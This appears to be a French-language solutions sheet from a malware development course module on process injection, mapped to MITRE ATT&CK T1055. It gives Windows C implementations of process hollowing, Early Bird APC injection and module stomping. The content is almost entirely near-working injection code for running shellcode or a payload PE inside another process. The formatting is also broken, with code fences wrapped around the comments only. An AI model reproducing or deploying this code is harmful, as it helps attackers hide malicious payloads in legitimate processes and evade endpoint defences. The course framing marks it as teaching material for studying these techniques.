⚠️ AVERTISSEMENT STRICT
Techniques de malware development. Usage éducatif uniquement.

SOLUTIONS - MODULE 24 : PROCESS INJECTION

# 
SOLUTION 1 : PROCESS HOLLOWING

## 

BOOL hollow_process(const char* target_path, LPVOID payload_pe, SIZE_T pe_size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);


```c
    // Créer processus suspendu
```
    CreateProcessA(target_path, NULL, NULL, NULL, FALSE,
                  CREATE_SUSPENDED, NULL, NULL, &si, &pi);


```c
    // Obtenir PEB address
```
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    PVOID peb_addr = (PVOID)ctx.Rdx;  // x64
    PVOID image_base;
    ReadProcessMemory(pi.hProcess, (BYTE*)peb_addr + 0x10,
                     &image_base, sizeof(PVOID), NULL);


```c
    // Unmap original
    typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
```
    pNtUnmapViewOfSection NtUnmap = (pNtUnmapViewOfSection)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmap(pi.hProcess, image_base);


```c
    // Allouer pour nouveau PE
```
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)payload_pe;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)payload_pe + dos->e_lfanew);

    LPVOID new_base = VirtualAllocEx(pi.hProcess, image_base,
                                     nt->OptionalHeader.SizeOfImage,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE);


```c
    // Écrire headers
```
    WriteProcessMemory(pi.hProcess, new_base, payload_pe,
                      nt->OptionalHeader.SizeOfHeaders, NULL);


```c
    // Écrire sections
```
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
                          (BYTE*)new_base + section[i].VirtualAddress,
                          (BYTE*)payload_pe + section[i].PointerToRawData,
                          section[i].SizeOfRawData, NULL);
    }


```c
    // Fixer entry point
```
    ctx.Rcx = (DWORD64)((BYTE*)new_base + nt->OptionalHeader.AddressOfEntryPoint);
    SetThreadContext(pi.hThread, &ctx);


```c
    // Reprendre
```
    ResumeThread(pi.hThread);

    return TRUE;
}

# 
SOLUTION 2 : EARLY BIRD

## 

BOOL early_bird_inject(const char* target_path, LPVOID shellcode, SIZE_T size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};


```c
    // Créer suspendu
```
    CreateProcessA(target_path, NULL, NULL, NULL, FALSE,
                  CREATE_SUSPENDED, NULL, NULL, &si, &pi);


```c
    // Allouer et écrire
```
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, size,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, mem, shellcode, size, NULL);


```c
    // Queue APC avant démarrage
```
    QueueUserAPC((PAPCFUNC)mem, pi.hThread, 0);


```c
    // Démarrer processus (APC s'exécutera au démarrage)
```
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return TRUE;
}

# 
SOLUTION 3 : MODULE STOMPING

## 

BOOL stomp_module(DWORD pid, const char* module_name, LPVOID shellcode, SIZE_T size) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);


```c
    // Trouver module
```
    HMODULE modules[1024];
    DWORD needed;
    EnumProcessModules(hProc, modules, sizeof(modules), &needed);

    HMODULE target_module = NULL;
    for (DWORD i = 0; i < needed / sizeof(HMODULE); i++) {
        char name[MAX_PATH];
        GetModuleBaseNameA(hProc, modules[i], name, sizeof(name));
        if (strcmp(name, module_name) == 0) {
            target_module = modules[i];
            break;
        }
    }

    if (!target_module) return FALSE;


```c
    // Change protection
```
    DWORD old_protect;
    VirtualProtectEx(hProc, target_module, size, PAGE_EXECUTE_READWRITE, &old_protect);


```c
    // Overwrite
```
    WriteProcessMemory(hProc, target_module, shellcode, size, NULL);


```c
    // Restore (optional)
```
    VirtualProtectEx(hProc, target_module, size, old_protect, &old_protect);


```c
    // Execute via CreateRemoteThread pointant vers module
```
    CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)target_module,
                      NULL, 0, NULL);

    CloseHandle(hProc);
    return TRUE;
}

Référence : Malware development course, MITRE ATT&CK T1055

